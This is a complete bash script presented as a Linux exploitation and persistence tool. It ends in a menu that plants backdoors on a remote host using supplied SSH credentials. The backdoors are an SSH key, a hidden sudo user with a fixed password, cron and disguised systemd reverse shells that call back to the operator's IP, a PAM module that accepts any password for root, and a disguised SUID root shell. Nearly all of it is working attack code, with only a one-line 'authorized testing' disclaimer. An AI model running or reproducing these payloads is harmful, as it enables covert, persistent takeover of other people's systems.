#!/bin/bash
# Linux Exploitation & Persistence Script
# For educational purposes and authorized security testing only

# ANSI color codes
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Print banner
echo -e "${BLUE}=========================================================${NC}"
echo -e "${BLUE}       Linux Exploitation & Persistence Tool              ${NC}"
echo -e "${BLUE}    FOR EDUCATIONAL AND AUTHORIZED TESTING PURPOSES ONLY  ${NC}"
echo -e "${BLUE}=========================================================${NC}"

# Check command line arguments
if [ $# -lt 3 ]; then
    echo -e "${RED}Usage: $0 <target_ip> <username> <password>${NC}"
    echo -e "${YELLOW}Example: $0 192.168.1.100 admin P@ssw0rd${NC}"
    exit 1
fi

# Set target information
TARGET="$1"
USERNAME="$2"
PASSWORD="$3"

# Check for required tools
echo -e "${YELLOW}[*] Checking for required tools...${NC}"
for tool in sshpass ssh-keygen nc; do
    if ! command -v $tool &>/dev/null; then
        echo -e "${RED}[-] $tool not found. Please install it.${NC}"
        echo -e "${YELLOW}[*] Try: sudo apt-get install $tool${NC}"
        exit 1
    fi
done
echo -e "${GREEN}[+] All required tools are available${NC}"

# Function to add SSH backdoor key
add_ssh_backdoor() {
    echo -e "${BLUE}[*] Adding SSH backdoor key to $TARGET${NC}"
    
    # Generate SSH key if it doesn't exist
    mkdir -p ~/.ssh/backdoors
    if [ ! -f ~/.ssh/backdoors/backdoor_key ]; then
        echo -e "${YELLOW}[*] Generating SSH key pair...${NC}"
        ssh-keygen -t rsa -b 3072 -f ~/.ssh/backdoors/backdoor_key -N "" -q
    fi
    
    # Create ~/.ssh directory on target if it doesn't exist
    echo -e "${YELLOW}[*] Setting up SSH directory on target...${NC}"
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$USERNAME@$TARGET" "mkdir -p ~/.ssh && chmod 700 ~/.ssh" 2>/dev/null
    
    # Copy our public key to target
    echo -e "${YELLOW}[*] Adding public key to authorized_keys...${NC}"
    sshpass -p "$PASSWORD" scp -o StrictHostKeyChecking=no ~/.ssh/backdoors/backdoor_key.pub "$USERNAME@$TARGET:~/.ssh/temp_key.pub" 2>/dev/null
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$USERNAME@$TARGET" "cat ~/.ssh/temp_key.pub >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys && rm ~/.ssh/temp_key.pub" 2>/dev/null
    
    # Test the connection
    echo -e "${YELLOW}[*] Testing SSH key access...${NC}"
    ssh -o StrictHostKeyChecking=no -o BatchMode=yes -i ~/.ssh/backdoors/backdoor_key "$USERNAME@$TARGET" "echo 'SSH key works'" &>/dev/null
    
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] SSH backdoor key successfully added to $TARGET${NC}"
        echo -e "${GREEN}[+] Key saved to: ~/.ssh/backdoors/backdoor_key${NC}"
        echo -e "${GREEN}[+] Connect using: ssh -i ~/.ssh/backdoors/backdoor_key $USERNAME@$TARGET${NC}"
    else
        echo -e "${RED}[-] Failed to add SSH backdoor key to $TARGET${NC}"
    fi
}

# Function to create a backdoor user
create_backdoor_user() {
    local backdoor_user="maintenance"
    local backdoor_pass="M@intenance123!"
    
    echo -e "${BLUE}[*] Creating backdoor user on $TARGET${NC}"
    
    # Add user and add to sudo group
    echo -e "${YELLOW}[*] Adding user $backdoor_user...${NC}"
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$USERNAME@$TARGET" "
        sudo useradd -m -s /bin/bash $backdoor_user &&
        echo \"$backdoor_user:$backdoor_pass\" | sudo chpasswd &&
        sudo usermod -aG sudo $backdoor_user
    " 2>/dev/null
    
    # Hide user from login screen (works on various distros)
    echo -e "${YELLOW}[*] Hiding user from login screen...${NC}"
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$USERNAME@$TARGET" "
        # For GDM
        if [ -d /var/lib/AccountsService/users ]; then
            sudo sh -c 'echo \"[User]
SystemAccount=true\" > /var/lib/AccountsService/users/$backdoor_user'
        fi
        
        # For LightDM
        if [ -f /etc/lightdm/lightdm.conf ]; then
            sudo sh -c 'grep -q \"^hidden-users\" /etc/lightdm/lightdm.conf || echo \"hidden-users=$backdoor_user\" >> /etc/lightdm/lightdm.conf'
            sudo sh -c 'sed -i \"s/^hidden-users=.*/&,$backdoor_user/\" /etc/lightdm/lightdm.conf'
        fi
    " 2>/dev/null
    
    # Verify user was created
    local result=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$USERNAME@$TARGET" "grep $backdoor_user /etc/passwd" 2>/dev/null)
    
    if [[ -n "$result" ]]; then
        echo -e "${GREEN}[+] Backdoor user $backdoor_user successfully created on $TARGET${NC}"
        echo -e "${GREEN}[+] Login credentials: $backdoor_user / $backdoor_pass${NC}"
    else
        echo -e "${RED}[-] Failed to create backdoor user on $TARGET${NC}"
    fi
}

# Function to add cron job backdoor
add_cron_backdoor() {
    local attacker_ip=$(hostname -I | awk '{print $1}')
    local attacker_port="4446"
    
    echo -e "${BLUE}[*] Creating cron job backdoor on $TARGET${NC}"
    
    # Create reverse shell command with multiple fallback methods
    local reverse_shell="*/15 * * * * /bin/bash -c '/bin/bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1 || python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$attacker_ip\\\",$attacker_port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"]);\" || python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$attacker_ip\\\",$attacker_port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"]);\")'"
    
    # Add cron job
    echo -e "${YELLOW}[*] Adding cron job...${NC}"
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$USERNAME@$TARGET" "
        (crontab -l 2>/dev/null; echo \"$reverse_shell\") | crontab -
    " 2>/dev/null
    
    # Verify cron job was added
    local result=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$USERNAME@$TARGET" "crontab -l | grep /dev/tcp" 2>/dev/null)
    
    if [[ -n "$result" ]]; then
        echo -e "${GREEN}[+] Cron job backdoor successfully created on $TARGET${NC}"
        echo -e "${GREEN}[+] The payload will connect back to $attacker_ip:$attacker_port every 15 minutes${NC}"
        echo -e "${GREEN}[+] Start a listener with: nc -lvnp $attacker_port${NC}"
    else
        echo -e "${RED}[-] Failed to create cron job backdoor on $TARGET${NC}"
    fi
}

# Function to create systemd service backdoor
create_systemd_backdoor() {
    local attacker_ip=$(hostname -I | awk '{print $1}')
    local attacker_port="4447"
    local service_name="system-monitor"
    
    echo -e "${BLUE}[*] Creating systemd service backdoor on $TARGET${NC}"
    
    # Create service file content
    local service_content="[Unit]
Description=System Monitor Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do sleep 300; /bin/bash -i >& /dev/tcp/$attacker_ip/$attacker_port 0>&1 || python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$attacker_ip\\\",$attacker_port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"]);\" || python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\\"$attacker_ip\\\",$attacker_port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\\\"/bin/bash\\\",\\\"-i\\\"]);\" ; done'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target"
    
    # Create a temporary service file
    echo "$service_content" > /tmp/temp_service.service
    
    # Copy service file to target
    echo -e "${YELLOW}[*] Creating service file on target...${NC}"
    sshpass -p "$PASSWORD" scp -o StrictHostKeyChecking=no /tmp/temp_service.service "$USERNAME@$TARGET:/tmp/$service_name.service" 2>/dev/null
    
    # Install service
    echo -e "${YELLOW}[*] Installing and enabling service...${NC}"
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$USERNAME@$TARGET" "
        sudo mv /tmp/$service_name.service /etc/systemd/system/ &&
        sudo systemctl daemon-reload &&
        sudo systemctl enable $service_name &&
        sudo systemctl start $service_name
    " 2>/dev/null
    
    # Clean up
    rm -f /tmp/temp_service.service
    
    # Verify service was created
    local result=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$USERNAME@$TARGET" "systemctl status $service_name" 2>/dev/null)
    
    if [[ -n "$result" ]]; then
        echo -e "${GREEN}[+] Systemd service backdoor successfully created on $TARGET${NC}"
        echo -e "${GREEN}[+] The service will connect back to $attacker_ip:$attacker_port every 5 minutes${NC}"
        echo -e "${GREEN}[+] Start a listener with: nc -lvnp $attacker_port${NC}"
    else
        echo -e "${RED}[-] Failed to create systemd service backdoor on $TARGET${NC}"
    fi
}

# Function to create PAM backdoor (allows any password for specified user)
create_pam_backdoor() {
    local backdoor_user="root"
    
    echo -e "${BLUE}[*] Creating PAM backdoor on $TARGET${NC}"
    
    # Create PAM backdoor script
    cat > /tmp/pam_backdoor.sh << 'EOL'
#!/bin/bash
# PAM backdoor script - allows any password for specified user

# Get the PAM configuration directory
if [ -d "/etc/pam.d" ]; then
    PAM_DIR="/etc/pam.d"
else
    echo "PAM directory not found"
    exit 1
fi

# Backup original PAM files
cp "$PAM_DIR/common-auth" "$PAM_DIR/common-auth.bak"

# Create backdoor PAM module
cat > /tmp/backdoor.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *username;
    int result = pam_get_user(pamh, &username, NULL);
    
    if (result != PAM_SUCCESS) {
        return result;
    }
    
    // Allow any password for the specified user
    if (strcmp(username, "BACKDOOR_USER") == 0) {
        return PAM_SUCCESS;
    }
    
    // Otherwise, pass control to the next module
    return PAM_IGNORE;
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    return PAM_SUCCESS;
}
EOF

# Replace placeholder with actual username
sed -i "s/BACKDOOR_USER/$1/g" /tmp/backdoor.c

# Compile PAM module
if command -v gcc >/dev/null 2>&1; then
    echo "Compiling PAM module..."
    gcc -fPIC -fno-stack-protector -c /tmp/backdoor.c -o /tmp/backdoor.o
    gcc -shared -o /usr/lib/security/pam_backdoor.so /tmp/backdoor.o
    
    # Clean up
    rm -f /tmp/backdoor.c /tmp/backdoor.o
    
    # Add module to PAM configuration
    echo "auth sufficient pam_backdoor.so" > /tmp/auth-backdoor
    cat "$PAM_DIR/common-auth" >> /tmp/auth-backdoor
    mv /tmp/auth-backdoor "$PAM_DIR/common-auth"
    
    echo "PAM backdoor installed successfully"
else
    echo "gcc not found, cannot compile PAM module"
    exit 1
fi
EOL

    # Set executable permission
    chmod +x /tmp/pam_backdoor.sh
    
    # Copy script to target
    echo -e "${YELLOW}[*] Uploading PAM backdoor script...${NC}"
    sshpass -p "$PASSWORD" scp -o StrictHostKeyChecking=no /tmp/pam_backdoor.sh "$USERNAME@$TARGET:/tmp/pam_backdoor.sh" 2>/dev/null
    
    # Run script on target
    echo -e "${YELLOW}[*] Installing PAM backdoor...${NC}"
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$USERNAME@$TARGET" "
        sudo bash /tmp/pam_backdoor.sh $backdoor_user &&
        sudo rm /tmp/pam_backdoor.sh
    " 2>/dev/null
    
    # Clean up local file
    rm -f /tmp/pam_backdoor.sh
    
    echo -e "${GREEN}[+] PAM backdoor installation attempted on $TARGET${NC}"
    echo -e "${GREEN}[+] If successful, any password will work for user: $backdoor_user${NC}"
}

# Function to create SUID backdoor binary
create_suid_backdoor() {
    echo -e "${BLUE}[*] Creating SUID backdoor on $TARGET${NC}"
    
    # Create C source for SUID backdoor
    cat > /tmp/suid_backdoor.c << 'EOL'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    // Drop a SUID shell
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
    return 0;
}
EOL
    
    # Copy source to target
    echo -e "${YELLOW}[*] Uploading backdoor source...${NC}"
    sshpass -p "$PASSWORD" scp -o StrictHostKeyChecking=no /tmp/suid_backdoor.c "$USERNAME@$TARGET:/tmp/suid_backdoor.c" 2>/dev/null
    
    # Compile and set SUID bit
    echo -e "${YELLOW}[*] Compiling and installing backdoor...${NC}"
    sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$USERNAME@$TARGET" "
        sudo gcc /tmp/suid_backdoor.c -o /usr/local/bin/system-helper &&
        sudo chmod 4755 /usr/local/bin/system-helper &&
        sudo rm /tmp/suid_backdoor.c
    " 2>/dev/null
    
    # Clean up local file
    rm -f /tmp/suid_backdoor.c
    
    # Verify backdoor was created
    local result=$(sshpass -p "$PASSWORD" ssh -o StrictHostKeyChecking=no "$USERNAME@$TARGET" "ls -la /usr/local/bin/system-helper" 2>/dev/null)
    
    if [[ "$result" == *"-rwsr-xr-x"* ]]; then
        echo -e "${GREEN}[+] SUID backdoor successfully created on $TARGET${NC}"
        echo -e "${GREEN}[+] Run '/usr/local/bin/system-helper' to get root shell${NC}"
    else
        echo -e "${RED}[-] Failed to create SUID backdoor on $TARGET${NC}"
    fi
}

# Main menu
while true; do
    echo -e "\n${BLUE}=== Linux Exploitation Menu ===${NC}"
    echo -e "1. Add SSH Backdoor Key"
    echo -e "2. Create Backdoor User"
    echo -e "3. Add Cron Job Backdoor"
    echo -e "4. Create Systemd Service Backdoor"
    echo -e "5. Create PAM Backdoor"
    echo -e "6. Create SUID Backdoor"
    echo -e "7. Run All Exploits"
    echo -e "0. Exit"
    
    read -p "Select an option: " OPTION
    
    case $OPTION in
        1) add_ssh_backdoor ;;
        2) create_backdoor_user ;;
        3) add_cron_backdoor ;;
        4) create_systemd_backdoor ;;
        5) create_pam_backdoor ;;
        6) create_suid_backdoor ;;
        7)
            add_ssh_backdoor
            create_backdoor_user
            add_cron_backdoor
            create_systemd_backdoor
            create_pam_backdoor
            create_suid_backdoor
            ;;
        0) echo -e "${GREEN}Exiting...${NC}"; exit 0 ;;
        *) echo -e "${RED}Invalid option${NC}" ;;
    esac
done
